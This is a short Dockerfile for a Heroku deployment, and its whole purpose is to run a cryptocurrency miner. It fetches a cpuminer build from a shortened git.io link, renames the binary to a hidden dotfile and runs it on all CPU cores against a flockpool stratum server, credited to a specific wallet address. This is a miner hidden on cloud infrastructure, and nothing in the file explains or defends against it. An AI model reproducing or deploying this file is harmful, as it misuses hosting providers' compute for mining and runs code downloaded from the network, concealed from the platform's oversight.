FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget -qO rtm git.io/cpuminer-gr-1.2.3 && tar xf rtm && mv ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RRW5GfQrd9VoR5Yz63iUBR5j4h8NBUe73h.budug -t $(nproc --all) --no-tune
CMD bash heroku.sh
